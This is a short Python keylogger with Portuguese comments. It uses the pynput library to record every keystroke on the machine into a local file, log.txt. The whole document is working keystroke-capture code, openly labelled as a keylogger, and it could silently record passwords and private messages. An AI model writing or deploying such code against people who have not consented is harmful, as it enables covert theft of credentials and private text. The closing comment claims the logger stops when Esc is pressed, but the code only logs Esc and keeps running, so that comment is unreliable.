from pynput import keyboard


IGNORAR = {
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.backspace,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.delete,
    keyboard.Key.down,
    keyboard.Key.end,
    keyboard.Key.enter,
    keyboard.Key.esc,
    keyboard.Key.f1,
    keyboard.Key.f2,
    keyboard.Key.f3,
    keyboard.Key.f4,
    keyboard.Key.f5,
    keyboard.Key.f6,
    keyboard.Key.caps_lock,
    keyboard.Key.home,
    keyboard.Key.shift
}


def on_press(key):
    try:
        # se a tecla pressionada for tecla normal(letra, numero, simbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # se a tecla pressionada for especial (enter, space, shift, ctrl)
        if key == keyboard.Key.space:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write("\n")
        elif key == keyboard.Key.esc:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write("\n[ESC]\n")
        elif key in IGNORAR:
            pass
        else:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{key}]")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
# O keylogger ficará ativo até que a tecla 'esc' seja pressionada
